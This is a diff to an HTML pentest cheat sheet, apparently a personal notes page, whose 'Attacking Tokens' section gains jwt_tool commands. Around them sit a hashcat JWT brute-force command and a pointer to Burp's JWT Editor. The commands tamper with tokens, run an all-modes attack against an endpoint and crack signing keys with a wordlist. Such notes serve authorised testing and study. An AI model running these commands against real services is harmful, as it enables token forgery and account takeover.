@@ -70,8 +70,10 @@
 </p><p id="288a92e5-ae11-4b72-8522-dfe3d1c93643" class="">
 </p><p id="1f4d271a-e370-4117-acd1-fad3d480d3e9" class=""><strong>Attacking Tokens:</strong></p><p id="db1b7113-5e5a-42df-8779-b7e073fd02fd" class="">Hashcat JWT signature bruteforce:</p><pre id="44a2dc7e-a97f-4d2d-81c1-46d2bc978fbc" class="code"><code>hashcat -a 0 -m 16500 &lt;JWT&gt; /usr/share/wordlists/rockyou.txt</code></pre><p id="c64d4afa-fd9f-460f-bdfa-6ae7bac96262" class="">
 </p><p id="dd34ef6b-8144-4563-ae98-d9e5803005b3" class="">
-</p><p id="a8cc2814-4319-4784-984c-22e31431f6d1" class="">jwt_tool:</p><p id="c48d6e53-726f-4d01-8a65-10aaa8a937c3" class="">
-</p><p id="ea1f82a5-6590-4cba-b8e5-703263639895" class="">
+</p><p id="a8cc2814-4319-4784-984c-22e31431f6d1" class="">jwt_tool:</p><pre id="c48d6e53-726f-4d01-8a65-10aaa8a937c3" class="code"><code>https://github.com/ticarpi/jwt_tool</code></pre><p id="619ec71e-8f98-455a-bd4e-08aacfdbfaea" class="">
+</p><pre id="e04573aa-2c0e-484e-b1c2-867ccaadb226" class="code"><code>jwt_tool &lt;JWT&gt; -T</code></pre><p id="afce69ff-ab05-4812-b326-de06e143843c" class="">
+</p><pre id="17731c4e-1607-456a-9a17-f42359182042" class="code"><code>jwt_tool -t http://0.0.0.0/end/point -rh &#x27;Authorization: Bearer &lt;JWT&gt;&#x27; -M at</code></pre><p id="1bcb8751-34af-4dc8-8389-bc8474d98c80" class="">
+</p><pre id="3f16f202-2020-4719-ad85-7849bc5deec5" class="code"><code>jwt_tool -C -d /rockyou.txt &#x27;&lt;JWT&gt;&#x27;</code></pre><p id="403cd44f-d21d-4288-b782-47beefdd0a38" class="">Burp suite extender: JWT editor</p><p id="c9c1419e-fa8f-4e37-a055-d3cf920a0b46" class="">
 </p></div></article></main></main>
 
     <!--==================== FOOTER ====================-->
